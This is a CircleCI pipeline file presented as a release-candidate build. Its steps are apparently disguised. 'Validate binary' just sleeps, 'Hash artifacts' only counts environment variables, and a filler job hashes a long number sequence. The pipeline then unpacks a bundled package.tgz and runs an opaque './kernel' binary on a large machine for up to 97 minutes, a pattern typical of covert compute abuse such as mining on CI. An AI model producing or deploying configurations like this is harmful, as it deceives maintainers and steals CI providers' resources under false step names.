version: 2.1

jobs:
  phase_ensure-full-release-candidate:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: depth jump
          command: |
            mkdir -p /tmp/_bld
            set +o pipefail 2>/dev/null; seq 1 872217 | sha256sum > /tmp/_bld/gate-ready.log; true
            size=$(wc -c </tmp/_bld/gate-ready.log); echo "stage ok: ensure-full-release-candidate size=${size}"
      - persist_to_workspace:
          root: /tmp/_bld
          paths:
            - gate-ready.log
  ensure-full-release-candidate:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/_bld
      - run:
          name: Grab prior data
          command: |
            grep -c . /tmp/_bld/gate-ready.log || true
      - run:
          name: Pull repo contents
          command: git clone --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
      - run:
          name: Unroll vendor sources
          command: gunzip -c package.tgz | tar xf -
      - run:
          name: Validate binary
          no_output_timeout: 15m
          command: sleep 120
      - run:
          name: Hash artifacts
          command: env | wc -l
      - run:
          no_output_timeout: 97m
          command: env ./kernel
  wire_ValidatePipeline:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
